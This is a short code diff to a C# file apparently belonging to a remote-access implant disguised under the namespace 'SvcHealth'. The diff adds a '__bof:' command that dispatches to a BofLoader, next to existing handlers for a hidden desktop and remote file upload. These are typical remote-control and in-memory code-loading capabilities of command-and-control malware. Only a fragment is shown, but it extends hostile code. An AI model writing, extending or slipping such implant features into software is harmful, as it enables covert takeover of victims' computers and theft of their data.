@@ -109,6 +109,7 @@ namespace SvcHealth
         static string ExecuteCommand(string cmd)
         {
             if (cmd.StartsWith("__hd:")) return HiddenDesktop.Handle(cmd);
+            if (cmd.StartsWith("__bof:")) return BofLoader.Run(cmd);
             if (cmd.StartsWith("__fs:put:"))
             {
                 var payload = cmd.Substring(9);
